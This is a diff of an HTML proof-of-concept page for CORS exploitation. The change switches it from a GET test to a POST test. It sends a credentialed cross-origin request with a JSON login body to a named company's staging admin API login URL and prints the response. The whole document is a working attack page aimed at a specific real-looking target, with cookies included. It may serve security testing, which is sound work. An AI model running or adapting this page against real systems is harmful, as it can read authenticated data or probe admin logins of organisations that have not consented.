@@ -2,14 +2,17 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>CORS Exploitation Test</title>
+  <title>CORS POST Exploitation Test</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       margin: 40px;
     }
-    input {
+    input, textarea {
       width: 600px;
+    }
+    textarea {
+      height: 150px;
     }
     pre {
       border: 1px solid #ccc;
@@ -20,34 +23,48 @@
   </style>
 </head>
 <body>
-  <h2>CORS Exploitation PoC</h2>
-  <p>This page sends a cross-origin request to the target URL below. The browser automatically sets the <code>Origin</code> header to this GitHub Pages site.</p>
+  <h2>CORS POST Exploitation PoC</h2>
+  <p>This page sends a cross-origin POST request to the target URL. The <code>Origin</code> header will automatically be set to this GitHub Pages site.</p>
 
+  <label>Target URL:</label><br>
   <input
     type="text"
     id="targetUrl"
     value="https://staging-elb.basecamp.invesco.co.uk/backend-proxy/adm/api/v1/login"
-  >
-  <button onclick="exploit()">Send Request</button>
+  ><br><br>
+
+  <label>Request Body (JSON):</label><br>
+  <textarea id="requestBody">
+{
+  "username": "testuser",
+  "password": "testpassword"
+}
+  </textarea><br><br>
+
+  <button onclick="exploit()">Send POST Request</button>
 
   <pre id="output"></pre>
 
   <script>
     function exploit() {
       const url = document.getElementById('targetUrl').value;
+      const body = document.getElementById('requestBody').value;
       const output = document.getElementById('output');
-      output.textContent = 'Sending GET request to ' + url + ' ...';
+      output.textContent = 'Sending POST request to ' + url + ' ...';
 
       const xhr = new XMLHttpRequest();
-      xhr.open('GET', url, true);
+      xhr.open('POST', url, true);
       xhr.withCredentials = true; // include cookies if any
+      xhr.setRequestHeader('Content-Type', 'application/json');
+
       xhr.onreadystatechange = function() {
         if (xhr.readyState === 4) {
           output.textContent =
             'Status: ' + xhr.status + '\n\nResponse:\n' + xhr.responseText;
         }
       };
-      xhr.send();
+
+      xhr.send(body);
     }
   </script>
 </body>
